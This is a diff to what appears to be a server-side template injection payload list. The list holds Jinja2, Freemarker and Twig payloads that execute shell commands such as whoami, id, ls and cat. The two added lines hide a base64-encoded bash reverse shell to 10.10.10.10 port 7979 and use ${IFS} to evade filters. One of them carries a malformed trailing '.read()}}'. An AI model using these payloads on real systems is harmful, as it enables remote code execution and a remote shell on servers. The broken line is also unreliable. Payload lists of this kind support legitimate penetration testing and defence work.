@@ -50,6 +50,7 @@ ${"freemarker.template.utility.Execute"?new()("whoami")}
 {{config.__class__.__init__.__globals__['os'].popen('cat%2B/*.txt').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('cat%2B%2F*.txt').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('cat%2B%2F%2A.txt').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC83OTc5IDA+JjE=${IFS}|base64${IFS}-d|bash')}}.read()}}
 {{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("pwd").read()}}
 {{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("id").read()}}
 {{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("ls").read()}}
@@ -64,6 +65,7 @@ ${"freemarker.template.utility.Execute"?new()("whoami")}
 {{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("cat%2b/*.txt").read()}}
 {{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("cat%2b%2F*.txt").read()}}
 {{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("cat%2b%2F%2A.txt").read()}}
+{{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC83OTc5IDA+JjE=${IFS}|base64${IFS}-d|bash").read()}}
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
